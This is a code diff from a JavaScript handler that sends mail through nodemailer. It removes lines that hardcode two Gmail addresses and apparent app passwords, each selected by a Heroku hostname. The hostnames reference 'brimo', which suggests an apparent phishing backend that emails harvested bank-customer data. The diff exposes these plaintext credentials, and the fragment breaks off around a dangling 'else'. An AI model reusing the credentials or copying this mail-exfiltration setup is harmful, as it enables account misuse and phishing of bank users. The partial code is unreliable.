@@ -6,18 +6,6 @@ export default function handler(req, res) {
 
     let email = '';
     let pass = '';
-
-    if (url == 'pilih-brimo.herokuapp.com'){
-
-       email = 'lajumacet78@gmail.com'
-       pass = 'krfomliejdqgwiqx'
-    }else
-    
- if (url == 'pilihan-brimo-terbaru.herokuapp.com'){
-
-       email = 'taulaju899@gmail.com'
-       pass = 'oplyndenhzofzixw'
- }else
         
         try {
             const transporter = nodemailer.createTransport({
